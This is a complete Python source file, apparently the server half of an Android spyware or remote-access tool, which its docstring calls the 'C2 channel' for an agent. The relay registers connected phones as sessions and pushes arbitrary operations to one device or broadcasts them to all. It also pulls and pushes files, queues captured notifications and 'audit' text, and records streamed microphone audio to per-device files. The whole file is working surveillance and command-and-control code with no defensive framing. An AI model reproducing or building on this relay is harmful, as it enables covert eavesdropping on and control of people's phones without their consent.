"""
IMMORTAL relay — stdlib-only TCP server for the agent's C2 channel.

Protocol (matches agent SockClient.java):
  frame: [4-byte big-endian length][JSON]
  binary: some envelopes are followed by N raw bytes (size announced)

The relay is a *pump*, not a brain:
  - agent connections become sessions (hello registers model/battery/ears)
  - the panel pushes ops through POST /api/agent/op and awaits the reply
    matched by envelope id
  - agent-initiated events (notifications, audit text, mic chunks) queue
    per session; mic PCM appends to a file you can pull any time
"""

import os
import json
import struct
import socket
import threading
import logging
import time
import base64

from flask import Blueprint, jsonify, request

log = logging.getLogger("agent.relay")

RELAY_PORT = int(os.environ.get("DC_AGENT_PORT", "9876"))
FILES_DIR = os.path.join(os.path.dirname(__file__), "agent_files")
os.makedirs(FILES_DIR, exist_ok=True)

relay_bp = Blueprint("agent_relay", __name__, url_prefix="/api/agent")


class Session:
    def __init__(self, sid, conn, addr, info):
        self.sid = sid
        self.conn = conn
        self.addr = addr
        self.info = info or {}
        self.send_lock = threading.Lock()
        self.events = []                 # agent-initiated JSON events
        self.events_lock = threading.Lock()
        self.connected_at = time.time()
        self.pcm_path = os.path.join(FILES_DIR, f"mic_{sid}.pcm")
        self.next_id = 0

    def new_id(self):
        with self.send_lock:
            self.next_id += 1
            return f"{self.sid}-{self.next_id}"

    def send_json(self, obj, raw=None):
        payload = json.dumps(obj).encode("utf-8")
        with self.send_lock:
            self.conn.sendall(struct.pack(">I", len(payload)) + payload)
            if raw is not None:
                self.conn.sendall(struct.pack(">I", len(raw)) + raw)

    def push_event(self, ev):
        with self.events_lock:
            self.events.append(ev)
            if len(self.events) > 500:
                self.events.pop(0)

    def drain_events(self):
        with self.events_lock:
            out, self.events = self.events, []
            return out


SESSIONS = {}
SESSIONS_LOCK = threading.Lock()
_WAITERS = {}                            # (sid, id) -> {"event":Event,"reply":None}
_started = False


# --------------------------------------------------------------------------
# wire helpers
# --------------------------------------------------------------------------
def _recv_exact(conn, n):
    buf = b""
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("closed")
        buf += chunk
    return buf


def _read_frame(conn):
    (length,) = struct.unpack(">I", _recv_exact(conn, 4))
    if length <= 0 or length > 8 * 1024 * 1024:
        raise ConnectionError("frame cap exceeded")
    return json.loads(_recv_exact(conn, length).decode("utf-8"))


def _read_raw(conn, n):
    return _recv_exact(conn, n)


# --------------------------------------------------------------------------
# connection handler
# --------------------------------------------------------------------------
def _handle(conn, addr):
    try:
        hello = _read_frame(conn)
        if hello.get("op") != "hello":
            conn.close()
            return
        sid = (f"{hello.get('brand','?')}_{hello.get('model','?')}"
               .replace(" ", ""))[:28]
        # avoid collision on reconnect of same device — replace old session
        with SESSIONS_LOCK:
            SESSIONS[sid] = Session(sid, conn, addr, hello)
        log.info("agent connected: %s from %s (%s)", sid, addr[0],
                 hello.get("android", "?"))
        _pump(sid, conn)
    except (ConnectionError, OSError, json.JSONDecodeError) as exc:
        log.info("session ended: %s", exc)
    finally:
        with SESSIONS_LOCK:
            for k, s in list(SESSIONS.items()):
                if s.conn is conn:
                    SESSIONS.pop(k, None)
        try:
            conn.close()
        except OSError:
            pass


def _pump(sid, conn):
    while True:
        frame = _read_frame(conn)
        op = frame.get("op", "")

        # ---- binary follow-ups --------------------------------------
        raw_bytes = None
        raw_size = frame.get("size")
        if op == "mic.data" and isinstance(raw_size, int):
            raw_bytes = _read_raw(conn, raw_size)
            _append_pcm(sid, raw_bytes)
        elif frame.get("raw_follow") and isinstance(raw_size, int):
            raw_bytes = _read_raw(conn, raw_size)

        # ---- reply to a pending panel op ----------------------------
        waiter = _WAITERS.pop((sid, frame.get("id")), None)
        if waiter is not None:
            reply = dict(frame)
            if raw_bytes is not None:
                path = _save_pull(sid, raw_bytes)
                reply["saved_to"] = path
            waiter["reply"] = reply
            waiter["event"].set()
            continue

        # ---- agent-initiated events ---------------------------------
        if op in ("notify", "audit", "audit.clip"):
            with SESSIONS_LOCK:
                s = SESSIONS.get(sid)
            if s:
                s.push_event(frame)


def _append_pcm(sid, chunk):
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
    if s:
        try:
            with open(s.pcm_path, "ab") as f:
                f.write(chunk)
        except OSError as exc:
            log.debug("pcm append failed: %s", exc)


def _save_pull(sid, raw):
    name = f"pull_{sid}_{int(time.time())}.bin"
    path = os.path.join(FILES_DIR, name)
    with open(path, "wb") as f:
        f.write(raw)
    return path


# --------------------------------------------------------------------------
# accept loop
# --------------------------------------------------------------------------
def _serve():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", RELAY_PORT))
    srv.listen(8)
    log.info("IMMORTAL relay listening on :%d", RELAY_PORT)
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=_handle, args=(conn, addr),
                         daemon=True).start()


def start_relay():
    global _started
    if _started:
        return False
    _started = True
    threading.Thread(target=_serve, daemon=True).start()
    return True


# --------------------------------------------------------------------------
# panel API
# --------------------------------------------------------------------------
@relay_bp.route("/sessions")
def sessions():
    with SESSIONS_LOCK:
        out = {}
        for sid, s in SESSIONS.items():
            with s.events_lock:
                queued = len(s.events)
            out[sid] = {"info": s.info, "addr": s.addr[0],
                        "connected_for_s":
                            round(time.time() - s.connected_at),
                        "events_queued": queued}
    return jsonify({"success": True, "sessions": out,
                    "relay_port": RELAY_PORT})


@relay_bp.route("/op", methods=["POST"])
def op():
    body = request.get_json() or {}
    sid = body.get("sid") or ""
    name = body.get("op") or ""
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
    if not s:
        return jsonify({"success": False,
                        "error": "aucune session: " + sid}), 404
    args = body.get("args") or {}
    env = {"op": name, "id": s.new_id()}
    env.update(args)

    raw = None
    if body.get("raw_b64"):                       # file.push support
        raw = base64.b64decode(body["raw_b64"])
        env["raw_expect"] = len(raw)

    waiter = {"event": threading.Event(), "reply": None}
    _WAITERS[(sid, env["id"])] = waiter
    try:
        s.send_json(env, raw=raw)
    except OSError as exc:
        _WAITERS.pop((sid, env["id"]), None)
        return jsonify({"success": False, "error": f"send: {exc}"}), 502

    timeout = min(float(body.get("timeout", 20)), 120)
    if not waiter["event"].wait(timeout):
        _WAITERS.pop((sid, env["id"]), None)
        return jsonify({"success": False,
                        "error": "agent muet (timeout)"}), 504
    return jsonify({"success": True, "reply": waiter["reply"]})


@relay_bp.route("/events")
def events():
    sid = request.args.get("sid") or ""
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
    if not s:
        return jsonify({"success": False, "error": "session inconnue"}), 404
    return jsonify({"success": True, "events": s.drain_events()})


@relay_bp.route("/broadcast", methods=["POST"])
def broadcast():
    body = request.get_json() or {}
    name = body.get("op") or ""
    sent = []
    with SESSIONS_LOCK:
        targets = list(SESSIONS.values())
    for s in targets:
        try:
            s.send_json({"op": name, **(body.get("args") or {})})
            sent.append(s.sid)
        except OSError:
            pass
    return jsonify({"success": True, "sent_to": sent})
